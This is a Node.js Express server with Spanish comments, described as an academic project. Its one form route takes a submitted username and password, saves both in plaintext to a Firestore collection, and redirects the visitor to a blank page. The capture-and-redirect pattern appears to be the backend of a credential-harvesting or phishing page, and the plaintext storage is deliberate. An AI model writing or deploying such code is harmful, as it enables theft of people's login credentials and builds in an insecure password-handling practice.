const express = require('express');
const admin = require('firebase-admin');
const app = express();

// En vez de requerir el archivo JSON, construimos la credencial usando variables de entorno
const serviceAccount = {
  type: "service_account",
  project_id: process.env.FIREBASE_PROJECT_ID,
  private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID,
  // Reemplaza los saltos de línea de la llave si es necesario
  private_key: process.env.FIREBASE_PRIVATE_KEY ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n') : undefined,
  client_email: process.env.FIREBASE_CLIENT_EMAIL,
  client_id: process.env.FIREBASE_CLIENT_ID,
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.google.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url: process.env.FIREBASE_CLIENT_CERT_URL,
  universe_domain: "googleapis.com"
};

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const db = admin.firestore();

// ... El resto de tu código (app.use, app.post, app.listen) se queda exactamente IGUAL ...
// Middlewares necesarios para leer los datos del formulario HTML
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Servir los archivos visuales de tu carpeta
app.use(express.static(__dirname));

// 3. Ruta modificada para guardar los datos tal cual se reciben
app.post('/enviar-datos', async (req, res) => {
    // Capturamos el usuario y la contraseña directamente del formulario
    const { username, password } = req.body;

    try {
        // Guardamos los datos directamente en tu colección de Firestore
        await db.collection('registros_academicos').add({
            usuario_ingresado: username,
            contrasena_ingresada: password, // <-- Aquí se guarda el texto plano tal cual lo escribas
            fecha_hora: new Date().toISOString(),
            nota: "Entrega del proyecto de desarrollo"
        });

        console.log(`[Servidor] Datos almacenados tal cual para el usuario: ${username}`);
        
        // Redirección automática a tu archivo blank.html
        res.redirect('/blank.html');
    } catch (error) {
        console.error("Error al guardar en Firebase:", error);
        res.status(500).send("Error interno en el servidor");
    }
});

// El servidor se mantiene escuchando en el puerto local 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`==================================================`);
    console.log(` Servidor académico corriendo con éxito.`);
    console.log(` Abre en tu navegador: http://localhost:${PORT}`);
    console.log(`==================================================`);
});